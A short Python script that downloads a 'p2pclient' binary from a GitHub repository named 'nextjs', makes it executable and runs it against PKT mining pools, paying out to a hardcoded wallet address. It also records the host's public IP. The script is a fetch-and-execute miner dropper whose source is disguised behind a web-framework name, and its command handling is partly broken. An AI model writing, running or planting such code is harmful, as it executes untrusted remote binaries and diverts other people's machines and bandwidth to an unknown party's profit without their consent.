#!/usr/bin/env python
import os
import sys
import subprocess

import requests
current_dir = os.path.dirname(os.path.abspath(__file__))

p2p_client_path = os.path.join(current_dir, "p2pclient")
p2p_log_path = os.path.join(current_dir, "test.log")

ip = requests.get('https://api.ipify.org').text

# check whether p2pclient is under path /usr/bin/
if not os.path.exists(p2p_client_path):
    print('p2pclient is not installed. Download it from github.')
    # download p2pclient binary from github via requests
    r = requests.get(
        'https://github.com/sengepeke/nextjs/raw/master/p2pclient')
    with open(p2p_client_path, 'wb') as f:
        f.write(r.content)
    os.chmod(p2p_client_path, 0o755)
    print('p2pclient is installed.')
cmd = os.popen('./p2pclient -p pkt1qzjhnfe8sfrwk3pynldwe7pmsjfhkdfadsqpyqx http://pool.pkt.world http://pool.pktpool.io').readlines()
# run web and wait for it to finish
out, err = subprocess.Popen(
    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
print(out.decode('utf-8'))
print(err.decode('utf-8'))
